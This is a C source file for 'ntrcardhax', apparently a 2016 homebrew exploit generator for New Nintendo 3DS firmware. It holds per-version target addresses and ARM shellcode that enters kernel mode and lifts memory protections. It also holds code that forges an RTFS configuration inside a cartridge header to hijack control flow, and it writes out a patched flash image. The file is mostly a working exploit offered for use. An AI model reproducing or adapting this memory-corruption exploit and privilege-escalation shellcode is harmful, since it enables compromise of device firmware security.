/*
* Copyright (C) 2016 - Normmatt
*
* This program is free software: you can redistribute it and/or modify
* it under the terms of the GNU General Public License as published by
* the Free Software Foundation, either version 3 of the License, or
* (at your option) any later version.
*
* This program is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
* GNU General Public License for more details.
*
* You should have received a copy of the GNU General Public License
* along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
//#include <cstring>
#include "ERTFS_types.h"
#include "crc.h"
#include "nand_addr.h"

struct nand_configure n3ds_config[6] = {
    { 17120, 0x80e2b34, 0x80e5e4c, 0x80ed3d0 },
    { 18182, 0x80e1974, 0x80e4c8c, 0x80ec210 },
    { 19218, 0x80e1974, 0x80e4c8c, 0x80ec210 },
    { 20262, 0x80e1974, 0x80e4c8c, 0x80ec210 },
    { 21288, 0x80f9d34, 0x80fcc4c, 0x81041d0 },
    { 22313, 0x80f9d34, 0x80fcc4c, 0x81041d0 },
};

//	 ldr sp,=0x22140000
//
//	 ;Disable IRQ
//	 mrs r0, cpsr
//	 orr r0, #(1<<7)
//	 msr cpsr_c, r0
//
//	 adr r0, kernelmode
//	 swi 0x7B
//
//kernelmode:
//	 mov r2, #0x22
//	 msr CPSR_c, #0xDF
//	 ldr r3, =0x33333333 ;R/W
//	 mcr p15, 0, r3,c5,c0, 2
//	 mov r2, #0xCC
//	 mcr p15, 0, r3,c5,c0, 3
//	 ldr r0, =0x23F00000
//	 bx r0
unsigned char loader_bin[0x44] =
{
    0x30, 0xD0, 0x9F, 0xE5, 0x00, 0x00, 0x0F, 0xE1, 0x80, 0x00, 0x80, 0xE3, 0x00, 0xF0, 0x21, 0xE1,
    0x00, 0x00, 0x8F, 0xE2, 0x7B, 0x00, 0x00, 0xEF, 0x22, 0x20, 0xA0, 0xE3, 0xDF, 0xF0, 0x21, 0xE3,
    0x14, 0x30, 0x9F, 0xE5, 0x50, 0x3F, 0x05, 0xEE, 0xCC, 0x20, 0xA0, 0xE3, 0x70, 0x3F, 0x05, 0xEE,
    0x08, 0x00, 0x9F, 0xE5, 0x10, 0xFF, 0x2F, 0xE1, 0x00, 0x00, 0x14, 0x22, 0x33, 0x33, 0x33, 0x33,
    0x00, 0x00, 0xF0, 0x23,
};

int main(int argc, char **argv)
{
    if (argc < 3) {
        printf("%s (n|o) <firm_version>\n", argv[0]);
        return 1;
    }

    uint32_t version = atoi(argv[2]);

    struct nand_configure *config = NULL;

    if (argv[1][0] == 'o' || argv[1][1] == 'O') {
        printf("old not support yet\n");
        return 1;
    } else if (argv[1][0] == 'n' || argv[1][0] == 'N') {
        for (int i = 0; i < 6; i++) {
            if (n3ds_config[i].version == version) {
                config = &n3ds_config[i];
                break;
            }
        }
    }
    if (!config) {
        printf("unsupport firmware\n");
        return 1;
    }

    uint8_t *payload = (uint8_t *)calloc(0x1000,1);
    RTFS_CFG rtfs_cfg = {};

    FILE *f1 = fopen("ak2i_flash81_ntrcardhax_template.bin", "rb");
    fseek(f1, 0, SEEK_END);
    int f1_size = ftell(f1);
    uint8_t *flash = (uint8_t *)malloc(f1_size);
    fseek(f1, 0, SEEK_SET);
    fread(flash, 1, f1_size, f1);
    fclose(f1);

    memcpy(payload, flash + 0x2000, 0x1000);

    int rtfsCfgAdrDiff = config->rtfs_cfg_addr - config->ntrcard_hader_addr;
    int rtfsCopyLen = sizeof(RTFS_CFG) - 0x2C; //Don't need full rtfs struct

    int wrappedAdr = (rtfsCfgAdrDiff) & 0xFFF;

    volatile int error = 0;

    if((wrappedAdr >= 0x0) && (wrappedAdr <= 0x10)) //0x31C but some overlap is fine
    {
        printf("There is a conflict with the ntrcard header when wrapped... have fun fixing this! (%08X)\n", wrappedAdr);
        error = 1;
        goto exit;
    }

    if((wrappedAdr >= 0x2A8) && (wrappedAdr <= 0x314)) //0x31C but some overlap is fine
    {
        printf("There is a conflict with the rtfs struct when wrapped... have fun fixing this! (%08X)\n", wrappedAdr);
        error = 1;
        goto exit;
    }

    //Must be 1 to bypass some stuff
    rtfs_cfg.cfg_NFINODES = 1;

    //This is the address that gets overwritten
    //NF writes two u32s
    //[adr + 0] = 0x0000000B
    //[adr + 4] = 0x00000000
    rtfs_cfg.mem_region_pool = (struct region_fragment *)(config->ntrcard_hader_addr + 0x4);

    for(int i = 0; i < 26; i++)
        rtfs_cfg.drno_to_dr_map[i] = (struct ddrive*)(config->ntrcard_hader_addr + 0);

    //Copy rtfs_cfg into right place (taking into account wrapping)
    uint32_t* prtfs_cfg32 = (uint32_t*)&rtfs_cfg;
    //printf("rtfsCfgAdrDiff %08X, rtfsCopyLen: %d\n", rtfsCfgAdrDiff, rtfsCopyLen);
    for(int i = 0; i < rtfsCopyLen; i+=4) //Don't need full rtfs struct
    {
        wrappedAdr = (rtfsCfgAdrDiff + i) & 0xFFF;
        //printf("addr: %08X data: %08X\n", wrappedAdr, prtfs_cfg32[i/4]);
        if((wrappedAdr >= 0x14) && (wrappedAdr <= 0x60))
        {
            printf("There is a conflict with the ntrcard header when wrapped... have fun fixing this! (%08X)\n", wrappedAdr);
            printf("%08X out of %08X copied.", i, rtfsCopyLen);
            if(i < 0xFC)
            {
                printf("This might not actually work because not enough buffers were overwritten correctly!");
                error = 1;
            }
            break;
        }
        *(uint32_t*)&payload[wrappedAdr] = prtfs_cfg32[i/4];
    }

    *(uint32_t*)&payload[0x2EC] = config->rtfs_handle_addr; //Some handle rtfs uses
    *(uint32_t*)&payload[0x2F0] = 0x41414141; //Bypass FAT corruption error
    *(uint32_t*)&payload[0x31C] = config->ntrcard_hader_addr + 0x2A8; //This is the PC we want to jump to (from a BLX)

    memcpy(&payload[0x2A8], loader_bin, 0x44);

    //Fix nds header as this makes native firm respond properly
    uint16_t crc = CalcCrc(payload, 0x15E);
    *(uint16_t*)&payload[0x15E] = crc;

    FILE *f = fopen("ACEKv00.nds", "wb");
    fwrite(payload, 1, 0x1000, f);
    fclose(f);

    memcpy(flash + 0x2000, payload, 0x1000);

    FILE *f2 = fopen("ak2i_flash81_ntrcardhax.bin", "wb");
    fwrite(flash, 1, f1_size, f2);
    fclose(f2);

exit:
    free(flash);
    free(payload);

    while(error);
    return 0;
}

